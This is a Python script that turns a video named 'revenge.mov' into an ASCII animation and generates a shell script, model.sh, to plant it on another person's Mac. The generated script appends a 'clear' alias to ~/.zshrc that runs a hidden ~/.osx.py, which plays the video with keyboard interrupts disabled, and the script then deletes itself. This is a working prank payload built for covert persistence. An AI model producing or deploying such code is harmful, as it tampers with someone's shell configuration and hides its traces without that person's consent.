from __future__ import annotations

from typing import TYPE_CHECKING, Iterator
from time import sleep
import inspect

import cv2

if TYPE_CHECKING:
    import numpy as np


def get_frames(video_path: str) -> Iterator[np.ndarray]:
    '''Yield each frame in the input video as a np.ndarray.'''
    try:
        cap = cv2.VideoCapture(video_path)

        while True:
            success, frame = cap.read()

            if not success:
                break

            yield frame
    finally:
        cap.release()


def get_ascii_image(frame: np.ndarray, image_size: tuple[int, int] = (80, 24)) -> str: 
    '''Return an ascii representation of the image. Each character is left as is.'''
    chars = '`.\',_-:~;"!^+/\><)(|=Lv?[]Ttr7}{izlcxfIYjnuJsF14*yoVaehk2PZ96CAEXU3qpwHmbKd5SO#D@RGNg&8B0W%QM$'

    image = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    image = cv2.resize(image, image_size)

    # NOTE: When taking characters one by one and appending it like this, all the escape stuff is taken care of.
    # In other words, if \n appears in the ascii representation, it will not be printed as a newline.
    return '\n'.join(''.join(chars[int(pixel / 255 * (len(chars) - 1))] for pixel in row) for row in image)


def get_ascii_video(video_path: str) -> list[str]:
    '''Return a list of ascii strings representing frames of video.'''
    return [get_ascii_image(frame) for frame in get_frames(video_path)]


def get_ascii_video_repr(ascii_video: list[str], ascii_video_name: str = 'ascii_video'):
    '''Get a string that if written into a python file will declare a list of
    ascii frames of video with the name given by `ascii_video_name`'''
    frames = ',\n'.join(repr(ascii_image) for ascii_image in ascii_video)

    return f'{ascii_video_name} = [{frames}]\n'


def print_frame(frame: str) -> None:
    '''Print a single frame of ascii video'''
    print(frame)


def clear_screen() -> None:
    '''Print the ansi escape codes to clear the screen and move the cursor to (0, 0)'''
    print('\033[2J', end='', flush=True)  # ANSI escape code to clear screen

    # NOTE: Is this really necessary?
    print('\033[H', end='', flush=True)  # ANSI escape code to move cursor to (0, 0).


def hide_cursor() -> None:
    '''Print the ansi escape code to hide the cursor. The cursor will be hidden
    permanently until the ANSI escape code to show it again (\033[?25h) is
    printed.'''
    print('\033[?25l', end='', flush=True)  # ANSI escape code to hide cursor


def show_cursor() -> None:
    '''Print the ansi escape code to show the cursor.'''
    print('\033[?25h', end='', flush=True)  # ANSI escape code to show cursor


def play_revenge_video(ascii_video: list[str], disable_keyboard_interrupt=False) -> None:
    '''Play the revenge ascii video. Not intened for re-use.'''
    try:
        hide_cursor()

        for i, frame in enumerate(ascii_video):
            try:
                clear_screen()
                print_frame(frame)

                if i == 0:
                    sleep(2.5)
                else:
                    sleep(1 / 40)
            except KeyboardInterrupt:
                if not disable_keyboard_interrupt:
                    raise KeyboardInterrupt
    finally:
        clear_screen()
        show_cursor()


def generate_revenge_python_file(video_path: str) -> str:
    '''Return a string that if written to a python file will product a valid
    program that displays the revenge video.'''
    ascii_video_name = 'asci_video'

    result = ''
    result += 'from time import sleep'
    result += '\n\n'
    result += get_ascii_video_repr(get_ascii_video(video_path), ascii_video_name=ascii_video_name)
    result += '\n\n'
    result += inspect.getsource(hide_cursor)
    result += '\n\n'
    result += inspect.getsource(show_cursor)
    result += '\n\n'
    result += inspect.getsource(clear_screen)
    result += '\n\n'
    result += inspect.getsource(print_frame)
    result += '\n\n'
    result += inspect.getsource(play_revenge_video)
    result += '\n\n'
    result += f'play_revenge_video({ascii_video_name}, disable_keyboard_interrupt=True)\n'

    return result


def get_echo_commands(string: str, output_file: str | None, max_command_length: int = 4096) -> Iterator[str]:
    '''
    Return a bash script that uses echo statements to print the input file. The
    echo statements will contain no more characters than specified in
    `max_command_length` to avoid errors when the shell tries to execute them.
    '''
    command_prefix = 'echo -n \''
    command_suffix = f'\' >> {output_file}' if output_file is not None else '\''
    line = ''

    for char in string:
        # NOTE: This almost certainly does not account for every troublemaking character!
        if char == '\\':
            char = '\\\\'
        elif char == '\'':
            char = '\'"\'"\''
        elif char == '\n':
            char = '\\n'
        elif char == '\r':
            char = '\\r'
        
        if len(command_prefix) + len(line) + len(char) + len(command_suffix) >= max_command_length:
            yield command_prefix + line + command_suffix

            line = char
        else:
            line += char

    yield command_prefix + line + command_suffix


with open('model.sh', 'w') as file:
    file.write('echo \'\\n\\n\\n# revenge\' >> ~/.zshrc\n')
    file.write('echo alias clear=\\\'clear\\; python3 ~/.osx.py\\\' >> ~/.zshrc\n')
    file.write('echo clear >> ~/.zshrc\n')
    file.write('rm ~/.osx.py 2>/dev/null\n')
    file.write('\nsleep 0.05\n'.join(get_echo_commands(generate_revenge_python_file('revenge.mov'), output_file='~/.osx.py')))
    file.write('\nsource ~/.zshrc\n')
    file.write('rm $0\n')
